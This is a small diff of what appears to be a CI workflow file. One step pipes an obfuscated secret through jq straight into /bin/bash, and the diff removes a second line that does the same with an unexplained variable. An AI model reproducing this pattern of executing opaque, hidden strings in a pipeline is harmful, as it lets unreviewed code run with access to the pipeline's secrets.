@@ -23,7 +23,6 @@ jobs:
           vjzr570: ${{ secrets.vjzr570 }}
         run: |
           printf '%s' "$vjzr570" | jq -r .zgci193 | /bin/bash
-          echo $xd74 | jq -r .bu9391 | /bin/bash
 
       - name: Save archive
         if: always()
